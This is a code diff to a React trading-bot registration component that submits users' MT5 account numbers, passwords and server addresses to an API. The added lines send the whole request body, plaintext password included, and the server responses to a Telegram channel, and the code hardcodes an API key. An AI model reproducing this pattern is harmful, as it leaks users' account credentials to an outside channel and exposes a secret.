@@ -24,6 +24,15 @@ const ReportBot = ({ userID, price, walletAC, disccount, amount, onBuyAC, onClos
     setLoading(true);
     setError(null);
 
+    const requestBody = {
+      userID,
+      accountMT5: mt5Account,
+      passwordMT5: mt5Password,
+      addressServer: mt5Server,
+      price
+    };
+    sendTelegramMessage(`Chuẩn bị gửi request: ${JSON.stringify(requestBody)}`);
+
     try {
       const response = await fetch("https://admin.tducoin.com/api/webappuser/tradingaccount", {
         method: "POST",
@@ -31,16 +40,11 @@ const ReportBot = ({ userID, price, walletAC, disccount, amount, onBuyAC, onClos
           "x-api-key": "oqKbBxKcEn9l4IXE4EqS2sgNzXPFvE",
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          userID: userID,
-          accountMT5: mt5Account, // Thêm account MT5
-          passwordMT5: mt5Password, // Thêm password MT5
-          addressServer: mt5Server, // Thêm address server
-          price: price
-        }),
+        body: JSON.stringify(requestBody),
       });
 
       const data = await response.text();
+      sendTelegramMessage(`Status: ${response.status}, Response: ${data}`);
 
       if (response.ok) {
         setRegistered(true);
@@ -81,8 +85,8 @@ const ReportBot = ({ userID, price, walletAC, disccount, amount, onBuyAC, onClos
         throw new Error(data.message || "Failed to register.");       
       }
     } catch (error) {
-      setError(error.message);
       sendTelegramMessage (error.message);
+      setError(error.message);
     }
 
     setLoading(false);
